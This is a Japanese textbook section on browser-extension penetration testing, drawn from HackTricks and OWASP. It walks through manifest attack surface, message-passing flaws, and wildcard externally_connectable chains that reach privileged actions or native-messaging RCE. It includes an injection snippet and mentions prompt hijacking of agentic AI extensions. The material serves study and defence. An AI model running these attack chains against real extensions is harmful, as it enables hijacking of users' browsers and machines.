# ブラウザ拡張機能のペネトレーションテスト手法

> **この節で分かること**
> - ブラウザ拡張が Content Script・Extension Core・Native Binary の3層でどう構成され、どんな境界で隔離されているかを説明できる
> - `manifest.json` の攻撃面フィールド（permissions / host_permissions / CSP / web_accessible_resources / externally_connectable）を読んでリスクを見積もれる
> - 拡張内外のメッセージパッシング経路（postMessage / runtime.sendMessage / native messaging）と、その検証不備の突きどころを説明できる
> - `externally_connectable` のワイルドカード信頼から背景スクリプトへ到達する攻撃連鎖を追え、監査できる
> - 公開ストアや自分のプロファイルから拡張のソースコードを取り出し、Tarnish / Neto などで解析できる
> - OWASP の13カテゴリ（権限過剰・データスキミング・非セキュアなメッセージパッシングなど）にそって防御策を提示できる

**元資料**: https://hacktricks.wiki/en/pentesting-web/browser-extension-pentesting-methodology/index.html （原典取得済み）、https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html （原典取得済み）

---

## 1. なぜ拡張がセキュリティ上重要なのか

ブラウザ拡張（Browser Extension）とは、ブラウザに機能を追加する小さなプログラムのこと。中身は JavaScript で書かれており、ブラウザがバックグラウンドで読み込んで動かす。広告ブロッカーやパスワードマネージャ、翻訳ツールなどが代表例である。

拡張は独自の DOM を持つが、ユーザーが開いている**他サイトの DOM とも相互作用できる**。DOM（Document Object Model）とは、Webページの構造をプログラムから読み書きできる形にしたもの。拡張はページの中身を読んだり書き換えたりできるということである。

この「他サイトに手を出せる」性質こそが危険の源になる。侵害された拡張、あるいは最初から悪意ある拡張は、ユーザーが訪れる**他サイトの機密性・完全性・可用性（CIA: Confidentiality, Integrity, Availability）を侵害しうる**。パスワードを盗む、閲覧履歴を覗く、ページを改ざんする、といったことが技術的に可能になる。

### 設計意図: 特権を層で分けて閉じ込める

拡張はしばしば非常に特権的である。だからこそブラウザは、拡張を丸ごと1つの実行環境に置くのではなく、権限の異なる複数の層に分割し、層のあいだに強い境界を設けている。攻撃者にとっての課題は「低特権の層から高特権の層へ、悪意ある入力をどう伝播させるか」になる。診断者はこの層と境界を意識すると、攻撃面の地図が描ける。

---

## 2. 拡張の3つの主要コンポーネント

拡張のアーキテクチャは**3つのコンポーネント**として理解するのが最も分かりやすい（HackTricks は出典として Berkeley の論文 `http://webblaze.cs.berkeley.edu/papers/Extensions.pdf` を引用している）。

```
[ Webページ (untrusted) ]
        │  共有DOM / postMessage
        ▼
[ Content Script ]  ← 単一ページのDOMに直接アクセス。権限はほぼ無い
        │  chrome.runtime.sendMessage
        ▼
[ Extension Core (background) ]  ← 拡張の権限の大半。Webへは XHR / CS 経由のみ
        │  sendNativeMessage / connectNative
        ▼
[ Native Binary ]  ← ユーザーの完全な権限でホストマシンにアクセス（RCEの終着点）
```

### 2.1 Content Scripts（コンテンツスクリプト）

各 Content Script は**単一の Web ページ**の DOM に直接アクセスできる。それゆえ**潜在的に悪意ある入力にさらされる**。ページはユーザーが訪れる任意のサイトであり、信頼できないからである。

ただし Content Script は、**拡張コア（extension core）へメッセージを送信する能力以外の権限をほとんど持たない**。数少ない例外として `storage` API などには直接アクセスできるが、それを超える機能は拡張コアへメッセージを送って代行してもらう。つまり Content Script は「ページに触れる手」だが「権限は持たない手」である。

### 2.2 Extension Core（拡張コア）

拡張コアは**拡張の権限・アクセスの大部分**を持つ。しかし Web コンテンツと相互作用できるのは XMLHttpRequest（`XMLHttpRequest`）と Content Scripts 経由のみである。また拡張コアはホストマシン（ユーザーのPCそのもの）への直接アクセスを**持たない**。権限は強いが、外界との接点は絞られている。

### 2.3 Native Binary（ネイティブバイナリ）

拡張は、**ユーザーの完全な権限でホストマシンにアクセスできる**ネイティブバイナリを許可できる。ネイティブバイナリは、Flash などのプラグインが使う標準の Netscape Plugin Application Programming Interface（NPAPI）を通じて拡張コアと相互作用する。ここまで到達すれば、攻撃者はブラウザの外、OS レベルでコードを実行できる可能性がある。

### 2.4 Boundaries（境界）: なぜ簡単には抜けないのか

拡張の各コンポーネントは**強い保護境界**で互いに分離されている。

- 各コンポーネントは**別々の OS プロセス**で動作する。
- Content Script と拡張コアは、ほとんどの OS サービスが使えない**サンドボックスプロセス**で動く。
- Content Script は**別々の JavaScript ヒープ**で実行され、関連する Web ページから分離される。
- Content Script と Web ページは**同じ DOM にアクセスする**が、両者は**JavaScript のポインタを一切交換しない**ため、JS 機能（変数・関数）の漏洩を防ぐ。

> **CAUTION（HackTricks）**: ユーザーの完全な権限を得るには、攻撃者は拡張を説得して、悪意ある入力を Content Script から拡張コアへ、さらに拡張コアからネイティブバイナリへと**順に渡させる**必要がある。

〔補足〕この「別々の JavaScript ヒープ」「同じ DOM を共有するが JS ポインタは交換しない」という仕組みが、後述する **isolated world（分離ワールド）** の実体である。Content Script はページの DOM を読み書きできるが、ページの JS 変数・関数には直接触れられない（逆も同様）。

---

## 3. `manifest.json` — 拡張のコアと攻撃面

Chrome 拡張は単なる ZIP フォルダで、拡張子は `.crx` である。拡張のコアはフォルダのルートにある **`manifest.json`** ファイルで、レイアウト・permissions・その他の設定を指定する。診断は必ずこのファイルを読むことから始める。

最小の例（逐語）:

```json
{
  "manifest_version": 2,
  "name": "My extension",
  "version": "1.0",
  "permissions": ["storage"],
  "content_scripts": [
    {
      "js": ["script.js"],
      "matches": ["https://example.com/*", "https://www.example.com/*"],
      "exclude_matches": ["*://*/*business*"]
    }
  ],
  "background": {
    "scripts": ["background.js"]
  },
  "options_ui": {
    "page": "options.html"
  }
}
```

〔補足〕このサンプルは `manifest_version: 2`（MV2）。MV2 では `background.scripts` で永続バックグラウンドページを指定する。MV3 では後述のとおり `background.service_worker`（Service Worker）に置き換わる。

### 3.1 `content_scripts`

Content Script は、ユーザーが**マッチするページに移動する**たびにロードされる。上の例では `https://example.com/*` にマッチし、かつ `*://*/*business*` にマッチ**しない**任意のページで動く。Content Script は**ページ自身のスクリプトのように**実行され、ページの DOM に任意アクセスできる。追加の URL フィルタは `include_globs` / `exclude_globs` でも表現できる。

Content Script の例（`storage` から `message` を読み、ページにボタンを足す。逐語）:

```js
chrome.storage.local.get("message", (result) => {
  let div = document.createElement("div")
  div.innerHTML = result.message + " <button>Explain</button>"
  div.querySelector("button").addEventListener("click", () => {
    chrome.runtime.sendMessage("explain")
  })
  document.body.appendChild(div)
})
```

ボタンがクリックされると `runtime.sendMessage()` で拡張ページへメッセージが飛ぶ。Content Script が API へ直接触れられないため、`storage` のような例外を除けば、機能は拡張ページへメッセージを送って代行させる。

Chrome で Content Script を表示・デバッグするには、Options > More tools > Developer tools（または Ctrl + Shift + I）を開き、**Source タブ → Content Scripts タブ**を見る。ここで実行中の Content Script を観察し、ブレークポイントを置いて実行フローを追える。

### 3.2 動的注入される Content Script

Content Script は必須ではない。拡張は `chrome.scripting`（Manifest V3）またはレガシーの `tabs.executeScript` API を使ってスクリプトを**動的に注入**することもできる。これにより「いつ注入するか」を細かく制御できる。

プログラム的に注入するには、注入先ページに対する **host permissions** が必要で、これは manifest で要求するか、`activeTab` を通じて一時的に取得する。`activeTab` ベースの manifest 例（逐語）:

```json
{
  "name": "My extension",
  ...
  "permissions": [
    "activeTab",
    "scripting"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "action": {
    "default_title": "Action Button"
  }
}
```

クリックで JS ファイルを注入する例（逐語）:

```javascript
// content-script.js
document.body.style.backgroundColor = "orange"

//service-worker.js - Inject the JS file
chrome.action.onClicked.addListener((tab) => {
  chrome.scripting.executeScript({
    target: { tabId: tab.id },
    files: ["content-script.js"],
  })
})
```

クリックで関数を注入する例（逐語）:

```javascript
//service-worker.js - Inject a function
function injectedFunction() {
  document.body.style.backgroundColor = "orange"
}

chrome.action.onClicked.addListener((tab) => {
  chrome.scripting.executeScript({
    target: { tabId: tab.id },
    func: injectedFunction,
  })
})
```

`scripting` 権限で登録する例（逐語）:

```javascript
// service-workser.js
chrome.scripting.registerContentScripts([
  {
    id: "test",
    matches: ["https://*.example.com/*"],
    excludeMatches: ["*://*/*business*"],
    js: ["contentScript.js"],
  },
])

// Another example
chrome.tabs.executeScript(tabId, { file: "content_script.js" })
```

### 3.3 `run_at` — 注入のタイミング

`run_at` は、**JS ファイルが Web ページに注入されるタイミング**を制御する。推奨かつデフォルトは `"document_idle"`。

| 値 | 意味 |
|----|------|
| `document_idle` | 可能な限りいつでも（Whenever possible） |
| `document_start` | `css` のファイルの後、ただし他の DOM 構築前・他スクリプト実行前 |
| `document_end` | DOM 完成の直後、ただし画像やフレームなどサブリソースのロード前 |

`manifest.json` 経由（逐語）:

```json
{
  "name": "My extension",
  ...
  "content_scripts": [
    {
      "matches": ["https://*.example.com/*"],
      "run_at": "document_idle",
      "js": ["contentScript.js"]
    }
  ],
  ...
}
```

`service-worker.js` 経由（逐語）:

```javascript
chrome.scripting.registerContentScripts([
  {
    id: "test",
    matches: ["https://*.example.com/*"],
    runAt: "document_idle",
    js: ["contentScript.js"],
  },
])
```

〔補足・診断観点〕`document_start` は後述の「プロトタイプベースデータスキミング」で重要になる。攻撃者ページは拡張スクリプトより先に prototype を汚染できるため、「`document_start` なら安全」という前提は成り立たない。

### 3.4 `background` — 拡張の神経中枢

Content Script が送ったメッセージは**バックグラウンドページ（background page）**が受け取り、拡張のコンポーネント間の調整を担う。バックグラウンドページは拡張のライフタイム全体で**永続**し、独自の DOM を持ち、ユーザー操作なしに目立たず動く。

要点:

- **役割**: 拡張の神経中枢。各部の通信と調整を保証する。
- **永続性**: 常に存在し、ユーザーには見えないが機能に不可欠。
- **自動生成**: 明示的に定義されていない場合、ブラウザが自動でバックグラウンドページを生成し、manifest 指定の全バックグラウンドスクリプトを含める。

バックグラウンドスクリプトの例（逐語）:

```js
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request == "explain") {
    chrome.tabs.create({ url: "https://example.net/explanation" })
  }
})
```

デバッグは**拡張の詳細画面で service worker を inspect** すると開発者ツールが開く。

〔補足・MV2/MV3差分〕MV2 では永続的な background page（`background.scripts` / `background.page`）だったが、MV3 では**非永続の Service Worker**（`background.service_worker`）に置き換わった。Service Worker はイベント駆動で、アイドル時に停止・再起動されるため、グローバル状態を前提にした設計は MV3 では壊れる。診断時は「Service Worker がどのメッセージで起動し、sender を検証しているか」を確認する。

### 3.5 Options ページなどの拡張ページ

拡張は各種のページを持ちうる。**Action pages**（拡張アイコンをクリックしてドロップダウンで出る）、**新しいタブでロードするページ**、**Option Pages**（クリックで拡張の設定を表示。例では `chrome://extensions/?options=fadlhnelkbeojnebcbkacjilhnbjfjca` でアクセスできた）などである。これらはバックグラウンドページのように永続ではないが、Content Script からメッセージを受け取れ、権限に従って拡張固有 API へアクセスできる。この「Content Script から到達でき、かつ特権 API を持つ」性質が、XSS の被害を拡大させる。

---

## 4. `manifest.json` の攻撃面フィールド

攻撃面は主に次の5つのフィールドに集約される。source（入力の入口）と sink（危険な出口）の観点で読む。

| フィールド | 意味 | 攻撃面・リスク |
|-----------|------|--------------|
| `permissions` | storage, tabs, nativeMessaging 等の能力 | 過剰付与で侵害時の被害拡大 |
| `host_permissions` | どの Web ページで動くか | 広すぎると全サイトのデータにアクセス |
| `content_scripts.matches` / `exclude_matches` | Content Script 注入対象 | ワイルドカードでネイティブメッセージ RCE 連鎖の起点に |
| `content_security_policy` | 拡張ページの CSP | 弱いと拡張ページ XSS。デフォルトは `script-src 'self'; object-src 'self';` |
| `web_accessible_resources` | Web からアクセス可能な拡張リソース | ClickJacking / XSS → 背景スクリプト到達。extension-id 露出。`use_dynamic_url` で ID 動的化可 |
| `externally_connectable` | 外部から接続できる拡張 / Web ページ | 最重要。XSS/テイクオーバー可能オリジン許可 → CS & CSP バイパスで背景スクリプト直接到達 |
| `background.service_worker`(MV3) / `background.scripts`(MV2) | 中枢ロジック | sender 検証不備で特権アクション悪用 |
| `nativeMessaging` 権限 + native host json | ネイティブバイナリ通信 | RCE に至りうる。`allowed_origins` にワイルドカード不可 |

### 4.1 `permissions` & `host_permissions`

`permissions` と `host_permissions` は、拡張が**どの権限**（storage, location...）を**どの Web ページ**で持つかを示す。拡張は非常に特権的でありうるため、悪意ある/侵害された拡張は、機密情報を盗みユーザーをスパイする手段を攻撃者に与える。HackTricks では詳細を別ページ `browext-permissions-and-host_permissions.md` に委譲している。

### 4.2 `content_security_policy`

Content Security Policy（CSP）は `manifest.json` 内でも宣言でき、定義次第で脆弱になりうる。CSP とは、ページがどこからスクリプトなどを読み込んでよいかを制限するブラウザの仕組みのこと。拡張ページのデフォルトはかなり制限的である（逐語）:

```bash
script-src 'self'; object-src 'self';
```

CSP バイパスの詳細は HackTricks の `../content-security-policy-csp-bypass/` に委譲されている。

### 4.3 `web_accessible_resources`

Web ページが拡張のページ（例 `.html`）にアクセスするには、そのページが `web_accessible_resources` に記載されている必要がある。例（逐語）:

```javascript
{
 ...
 "web_accessible_resources": [
   {
     "resources": [ "images/*.png" ],
     "matches": [ "https://example.com/*" ]
   },
   {
     "resources": [ "fonts/*.woff" ],
     "matches": [ "https://example.com/*" ]
   }
 ],
 ...
}
```

これらのページは次の形式の URL でアクセスできる:

```
chrome-extension://<extension-id>/message.html
```

公開拡張では **extension-id はアクセス可能**（公開）である。ただし `use_dynamic_url` が使われていると、この ID は動的になりうる。

診断上の注意点:

- ここに記載されたページでも、CSP の `frame-ancestors` により ClickJacking から保護されている場合がある。ClickJacking 可能と断定する前に CSP を確認する。
- これらのページを拡張のみからロード可能にし任意 URL からロードできないようにすれば、ClickJacking を防げる。
- `web_accessible_resources` のページや他の拡張ページも**バックグラウンドスクリプトと通信できる**。よって一つが XSS に脆弱なら、より大きな脆弱性を開く。
- これらのページは iframe 内でしか開けないが、**新しいタブからは extension ID を知っていれば拡張の任意のページにアクセス可能**。よって XSS が見つかれば、そのページが `web_accessible_resources` になくても悪用されうる。

ClickJacking の実例は HackTricks の `browext-clickjacking.md` に委譲されている。

> ### 📌 ここは自分で開いて読んでください
> **資料**: HackTricks — Browser Extension Pentesting Methodology（レンダリング版、および `{{#ref}}` 委譲先の子ページ群）— https://hacktricks.wiki/en/pentesting-web/browser-extension-pentesting-methodology/index.html
> **なぜ**: 本教科書の執筆環境からはレンダリング版ホストが自動取得できなかった（理由: サイト側の egress 制限で 403）。本文の記述は GitHub 上の原典 Markdown を全文取得して作成しているが、**図（3コンポーネントのアーキテクチャ図など）・スクリーンショット・委譲された子ページの本文**は含まれていない。
> **読みどころ**:
> 1. 本文中の figure: 拡張3コンポーネントのアーキテクチャ図（Berkeley 論文由来）、options ページのアクセス例、web_accessible_resources の extension-id 露出例、Inspect service worker の画面。
> 2. 委譲子ページ `browext-clickjacking.md`（web_accessible_resources 経由の ClickJacking 実例）、`browext-xss-example.md`（Iframe URL / DOM ベース XSS で拡張を侵害する具体例）。
> 3. `browext-permissions-and-host_permissions.md`、`../postmessage-vulnerabilities/`、`../content-security-policy-csp-bypass/`、`forced-extension-load-preferences-mac-forgery-windows.md`。
> **代替手段**: 原文の再取得は raw URL が確実 — `https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/README.md`

### 4.4 `externally_connectable`（最重要）

`externally_connectable` は、**どの拡張や Web ページ**が `runtime.connect` と `runtime.sendMessage` を通じてあなたの拡張に接続できるかを宣言する。設定パターンは次のとおり。

| 宣言 | 接続できるもの |
|------|--------------|
| 宣言なし、または `"ids": ["*"]` | すべての拡張が接続可、Web ページは不可 |
| `"ids": ["aaaa...a"]`（特定ID） | それらのアプリケーションのみ |
| `"matches": [...]`（URL パターン） | それらの Web アプリが接続可 |
| `"externally_connectable": {}` | いかなるアプリも Web も接続不可 |

`matches` の例（逐語）:

```json
"matches": [
      "https://*.google.com/*",
      "*://*.chromium.org/*",
```

ここに記載する拡張や URL が**少ないほど攻撃面は小さくなる**。

> **CAUTION（HackTricks）**: XSS やテイクオーバーに脆弱な Web ページが `externally_connectable` に記載されている場合、攻撃者は**バックグラウンドスクリプトへ直接メッセージを送信**でき、Content Script とその CSP を**完全にバイパス**できる。これは非常に強力なバイパスである。

さらに、クライアントが不正な拡張をインストールした場合、許可された Web ページに XSS データを注入したり、`webRequest` / `declarativeNetRequest` を悪用して対象ページの JS ファイルへのリクエストを改変したりできる。対象ページの CSP がこの連鎖を制約しうる。

---

## 5. ワイルドカード信頼オリジンから特権アクション注入

これは `externally_connectable` の最も実戦的な突きどころである。拡張が高特権のメッセージハンドラを Web に公開している場合、`https://*.example.com/*` のような広いパターンを信頼するのは避けるべきである。マッチする**任意のサブドメイン上の一つの XSS・サブドメインテイクオーバー・ベンダーウィジェットの侵害**が、拡張の Web 向け API を乗っ取ることと等価になるからである。

### 5.1 典型的な悪用経路

1. 拡張 ID を見つけ、`externally_connectable.matches` を列挙する。
2. **特権アクション**（`open tab`, `read page`, `submit prompt`, `fetch with extension privileges`, `native messaging` など）をトリガーするメッセージタイプを特定する。
3. **いずれかの**信頼されたオリジンで JavaScript 実行を得る。
4. リクエストを拡張へ直接送る（逐語）:

```javascript
chrome.runtime.sendMessage("<extension-id>", {
  type: "privileged_action",
  payload: { attacker: "controlled" },
})
```

これは特に**エージェント型拡張（agentic extensions）**やアシスタントで危険で、「メッセージ」が拡張の host 権限で実行される完全な**命令プロンプト（instruction prompt）**になりうる。

> **CAUTION（HackTricks）**: 信頼された第一者（first-party）サブドメイン上のベンダーコードを信頼境界の一部として扱うこと。`captcha.example.com`, `cdn.example.com`, サポートウィジェットのオリジンが許可されている場合、その第三者コンポーネントの XSS は、バグがメインアプリにあったのと同様に拡張へピボットしうる。

〔補足・実例〕HackTricks の参照[11]は「ShadowPrompt: How Any Website Could Have Hijacked Anthropic's Claude Chrome Extension」（koi.ai）。実在のエージェント型拡張で `externally_connectable` の広い信頼が問題化した実例として引用されている。

> ### 📌 ここは自分で開いて読んでください
> **資料**: ShadowPrompt（koi.ai）— https://www.koi.ai/blog/shadowprompt-how-any-website-could-have-hijacked-anthropic-claude-chrome-extension
> **なぜ**: 本環境から自動取得できていない（HackTricks 原典からの参照リンクであり本文には要約のみ）。実在の拡張で広い信頼がどう悪用可能だったかの一次記事である。
> **読みどころ**:
> 1. `externally_connectable` の広い信頼が、実在のエージェント型拡張でどのように命令プロンプト注入につながったか。
> 2. 攻撃者が任意サイトから特権メッセージを送る具体的な連鎖。
> **代替手段**: なし（同等の考え方は HackTricks 原典の該当節で読める）

### 5.2 信頼の監査（`onMessageExternal`）

Web ページからのメッセージを受け付ける拡張をレビューするときのチェック:

- `chrome.runtime.onMessageExternal.addListener`、`chrome.runtime.onConnectExternal.addListener`、およびそこから到達可能な機微なハンドラを探す。
- sender に対し、suffix・regex・ワイルドカードではなく**厳密なオリジン等価（exact origin equality）**をチェックしているか検証する。
- ハンドラが**メッセージタイプ + オリジンを一緒に**認可しているか検証する。テレメトリに安全なオリジンが特権アクションに安全とは限らない。
- 親 eTLD+1 を共有するというだけでサブドメインを信頼していないか確認する。
- 許可オリジンが第三者 JS・ユーザー生成コンテンツ・レガシー静的アセットをホストしていないか確認する。

悪いパターン（逐語）:

```javascript
if (sender.origin.endsWith(".example.com")) { /* trust */ }
if (/^https:\/\/.*\.example\.com$/.test(sender.origin)) { /* trust */ }
```

推奨（最小オリジン集合への厳密マッチ、逐語）:

```javascript
if (sender.origin !== "https://app.example.com") return
```

### 5.3 信頼された静的アセットのロールバック探索

信頼オリジンが予測可能なパスから**バージョン付き静的アセット**を配信している場合、古いバージョンを辿り、まだ到達可能な脆弱ビルドを探す。現行版がパッチ済みでも、拡張がアーカイブ済みアセットをホストするオリジンをまだ信頼していれば有効である。

よくあるパス例:

```
/assets/widget/1.26.0/index.html
/static/app-2024.12.1/
/cdn/component/v1234/
```

実践的チェック: 観測されたバージョンから開始し、セマンティックバージョン/ビルド番号をデクリメントして古いパスを要求し、`200` / `301` / キャッシュヒットを探す。古い JS バンドルを読み、DOM XSS・安全でないメッセージハンドラ・信頼オリジン上で JS 実行を再確立できるガジェットを探す。

---

## 6. 通信経路の全体像

拡張の通信は大きく4系統ある。診断では「どこで検証しているか」を各経路で確認する。

| API | 方向 | 備考 |
|-----|------|------|
| `window.postMessage` / `window.addEventListener("message")` | Web ↔ Content Script | 検証: `event.isTrusted`, origin, `event.source !== window`。上書きされうる |
| `chrome.runtime.sendMessage` / `chrome.runtime.onMessage.addListener` | 拡張内（CS↔Background） | 単発 JSON メッセージ。`return true` で非同期応答 |
| `chrome.runtime.connect()` / `port.postMessage` / `port.onMessage` | 拡張内 | 永続接続 |
| `chrome.tabs.sendMessage(tabId, ...)` | Background → 特定タブの CS | tabID 指定 |
| `chrome.runtime.sendMessage(extensionId, ...)` | 外部 Web/拡張 → 拡張 | `externally_connectable` 必須。extension ID 必須 |
| `chrome.runtime.onMessageExternal` / `onConnectExternal` | 外部受信 | exact origin equality で検証必須 |
| `chrome.runtime.sendNativeMessage` / `connectNative` | Background → ネイティブバイナリ | stdio。RCE 危険 |

### 6.1 Web ↔ Content Script

Content Script とホストページは互いに**隔離（isolation）**されているが、両者とも共有リソースである**DOM**に触れる。ホストページが Content Script と通信するには、双方がアクセスできる DOM を通信チャネルにする必要がある。通常は Post Message が使われ、Web 側に `window.postMessage`、Content Script 側に `window.addEventListener` が見つかる。

`content-script.js`（逐語）:

```javascript
// This is like "chrome.runtime.sendMessage" but to maintain the connection
var port = chrome.runtime.connect()

window.addEventListener(
  "message",
  (event) => {
    // We only accept messages from ourselves
    if (event.source !== window) {
      return
    }

    if (event.data.type && event.data.type === "FROM_PAGE") {
      console.log("Content script received: " + event.data.text)
      // Forward the message to the background script
      port.postMessage(event.data.text)
    }
  },
  false
)
```

`example.js`（ページ側、逐語）:

```javascript
document.getElementById("theButton").addEventListener(
  "click",
  () => {
    window.postMessage(
      { type: "FROM_PAGE", text: "Hello from the webpage!" },
      "*"
    )
  },
  false
)
```

セキュアな Post Message 通信は、受信メッセージの真正性をチェックすべきである:

- **`event.isTrusted`**: ユーザーのアクションでトリガーされた場合のみ True。
- **origin domain**: 許可ドメインの allowlist からのみ受け取る。正規表現を使う場合は非常に注意する。
- **Source**: `received_message.source !== window` で、リッスンしている同じウィンドウから来たか確認する。

これらのチェックは、実施していても脆弱でありうる。Post Message バイパスの詳細は HackTricks の `../postmessage-vulnerabilities/` に委譲されている。

もう一つの通信手段は **Iframe URLs** 経由（例は `browext-xss-example.md`）。また **DOM** 自体も、厳密には通信ではないが Web と Content Script が共に触れる。Content Script が DOM から情報を読み、**Web DOM を信頼**していると、Web（信頼すべきでない、または XSS に脆弱）がそのデータを改変して Content Script を侵害しうる。

### 6.2 拡張内部（Content Script ↔ Background）

拡張内でメッセージを送るには通常 `chrome.runtime.sendMessage` を使い（多くは background が処理）、`chrome.runtime.onMessage.addListener` で受ける。永続接続には `chrome.runtime.connect()` を使い、`port.postMessage` / `port.onMessage` で送受信する。Background から特定タブの Content Script へは `chrome.tabs.sendMessage` にタブ ID を指定して送る。

Content Script からの送信（逐語）:

```javascript
;(async () => {
  const response = await chrome.runtime.sendMessage({ greeting: "hello" })
  // do something with response here, not outside the function
  console.log(response)
})()
```

Background から選択タブの CS への送信（逐語）:

```javascript
;(async () => {
  const [tab] = await chrome.tabs.query({
    active: true,
    lastFocusedWindow: true,
  })
  const response = await chrome.tabs.sendMessage(tab.id, { greeting: "hello" })
  // do something with response here, not outside the function
  console.log(response)
})()
```

受信側のリスナー（逐語）:

```javascript
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  console.log(
    sender.tab
      ? "from a content script:" + sender.tab.url
      : "from the extension"
  )
  if (request.greeting === "hello") sendResponse({ farewell: "goodbye" })
})
```

`sendResponse()` を**非同期**で使うには、ハンドラで `return true;` が必須である。複数ページが `onMessage` を受ける場合、特定イベントに**最初に `sendResponse()` を実行したページ**だけが応答を届けられ、後続の応答は無視される。新規開発ではコールバックより Promise を優先すべきである。

### 6.3 外部（`externally_connectable`）から拡張へ

許可された外部 Web/拡張は、拡張 ID を明記してリクエストを送る（逐語）:

```javascript
chrome.runtime.sendMessage(extensionId, ...
```

### 6.4 Native Messaging — RCE の終着点

バックグラウンドスクリプトはシステム内のバイナリと通信できる。ここがセキュアでないと**RCE のような致命的脆弱性**を招く。

送信の例（逐語）:

```javascript
chrome.runtime.sendNativeMessage(
  "com.my_company.my_application",
  { text: "Hello" },
  function (response) {
    console.log("Received " + response)
  }
)
```

ネイティブ側は、次のような json をインストールして自分を登録する（逐語）:

```json
{
  "name": "com.my_company.my_application",
  "description": "My Application",
  "path": "C:\\Program Files\\My Application\\chrome_native_messaging_host.exe",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://knldjmfmopnpolahpmmgbagdohdnhkik/"]
}
```

`name` は `runtime.connectNative()` / `runtime.sendNativeMessage()` に渡す文字列、`path` はバイナリへのパス、`type` は `stdio` の1種のみ、`allowed_origins` はアクセスできる拡張を示す（**ワイルドカード不可**）。Chrome はこの json を Windows レジストリや macOS/Linux の所定パスから探す。拡張は `nativeMessaing`（原文ママ）権限も宣言する必要がある。

参照[13] spaceraccoon「Universal Code Execution in Browser Extensions」が示す脆弱パターン:

1. 拡張の Content Script に**ワイルドカードパターン**がある。
2. Content Script が `postMessage` メッセージを `sendMessage` で背景へ渡す。
3. 背景が `sendNativeMessage` でネイティブアプリへ渡す。
4. ネイティブアプリがメッセージを**危険に処理**し、コード実行に至る。

この連鎖が「任意のページ → RCE」の完全な経路を作る。

> ### 📌 ここは自分で開いて読んでください
> **資料**: spaceraccoon「Universal Code Execution in Browser Extensions」— https://spaceraccoon.dev/universal-code-execution-browser-extensions/
> **なぜ**: 本環境から自動取得できていない（HackTricks 原典からの参照リンク）。任意ページ→RCE の完全な連鎖を実演した一次記事である。
> **読みどころ**:
> 1. content script wildcard → `sendMessage` → `sendNativeMessage` → ネイティブ側の危険処理という連鎖の実演。
> 2. manifest データセットでの探索クエリ（`node query.js ...`、本文9節参照）の使い方。
> **代替手段**: なし

---

## 7. メモリ・コード・クリップボード内の機密情報

拡張が**機密情報をメモリに保存**していると、ローカルプロセスダンプ（特に Windows）で露出しうる。よって拡張のメモリは**セキュアと見なすべきでなく**、認証情報やニーモニックフレーズを保存すべきでない。当然、**コードにも機密情報を置いてはならない**（コードは公開される）。

ブラウザからメモリをダンプするには、プロセスメモリをダンプするか、拡張の設定で **`Inspect pop-up`** → **`Memory`** セクション → **`Take a snaphost`**（原文ママ）を実行し、`CTRL+F` でスナップショット内を検索する。ニーモニックやパスワードのような高度に機微な情報は、**クリップボードにコピーできないようにする**（または数秒で消す）。クリップボード監視プロセスに取得されうるためである。

---

## 8. ソースコードの取得

拡張は「クライアントサイドで完全に配布されるコード」であり、ソースは誰でも取り出せる。診断の第一歩である。

### 8.1 コマンドラインで ZIP として DL

`curl` で CRX を取得し展開する（逐語）:

```bash
extension_id=your_extension_id   # Replace with the actual extension ID
curl -L -o "$extension_id.zip" "https://clients2.google.com/service/update2/crx?response=redirect&os=mac&arch=x86-64&nacl_arch=x86-64&prod=chromecrx&prodchannel=stable&prodversion=44.0.2403.130&x=id%3D$extension_id%26uc"
unzip -d "$extension_id-source" "$extension_id.zip"
```

### 8.2 CRX Viewer

- Web 版: https://robwu.nl/crxviewer/
- 拡張版: **Chrome Extension Source Viewer**（Chrome Web Store からインストール、ソースは GitHub リポジトリ `Rob--W/crxviewer`）。

### 8.3 ローカルインストール済み拡張のソース閲覧

1. `chrome://version/` を開き "Profile Path" を見つけてローカルプロファイルディレクトリへ。
2. その中の `Extensions/` サブフォルダへ移動する。
3. ここに全インストール済み拡張が、通常は可読な形式で入っている。

ID と名前の対応は、`about:extensions` で Developer Mode を有効化して各 ID を見るか、各フォルダの `manifest.json` の `name` フィールドで確認する。

### 8.4 拡張子変更 / Developer Mode

`.crx` を `.zip` に変更し WinRAR / 7-Zip で展開する方法もある。Chrome の `chrome://extensions/` で "Developer mode" を有効化し "Load unpacked extension..." で既存コードを閲覧・変更することもできる。

### 8.5 ブラウザへの拡張の読み込み

1. 拡張をダウンロードして解凍する。
2. `chrome://extensions/` で Developer Mode を有効化する。
3. **`Load unpacked`** をクリックする。

Firefox では `about:debugging#/runtime/this-firefox` で **`Load Temporary Add-on`** をクリックする。

---

## 9. 大規模探索・ツール・後侵害

### 9.1 manifest データセットで脆弱候補を探す

`palant/chrome-extension-manifests-dataset` で、多数の拡張の manifest を横断検索できる。例えばユーザー数が多く、`content_scripts` と `nativeMessaging` を持つ拡張（前述の RCE 連鎖の起点になりうる）を探すクエリ（逐語）:

```bash
# Query example from https://spaceraccoon.dev/universal-code-execution-browser-extensions/
node query.js -f "metadata.user_count > 250000" "manifest.content_scripts?.length > 0 && manifest.permissions?.includes('nativeMessaging')"
```

### 9.2 解析ツール

| ツール | 種別 | できること |
|--------|------|-----------|
| **Tarnish**（thehackerblog.com/tarnish/） | Web 解析 | webstore リンクから拡張を取得。manifest viewer、Fingerprint 解析、Clickjacking 解析、Permission Warning viewer、Dangerous Functions（`innerHTML`, `chrome.tabs.executeScript` 等）、Entry Points、CSP 解析・バイパスチェック、Retire.js で既知脆弱ライブラリ検出、整形版 DL、レポート URL |
| **Neto**（github.com/elevenpaths/neto） | Python 3 | Firefox/Chrome の拡張を展開し、manifest・ローカライゼーション・JS・HTML から特徴を抽出 |
| **crxaminer**（crxaminer.tech） | Web | 要求権限などから拡張使用のリスクレベルを評価 |

Tarnish の Dangerous Functions と Entry Points のスキャナは、アラートに「関連コードと行」「問題の説明」「View File」「ファイルパスと完全な chrome 拡張 URI」「ファイル種別（Background Page / Content Script / Browser Action 等）」「そのファイルが include される全ページと web_accessible_resource ステータス」を付ける。初回スキャンは遅いが2回目はキャッシュでほぼ即時になる。

### 9.3 後侵害: 強制拡張読み込み（Windows）

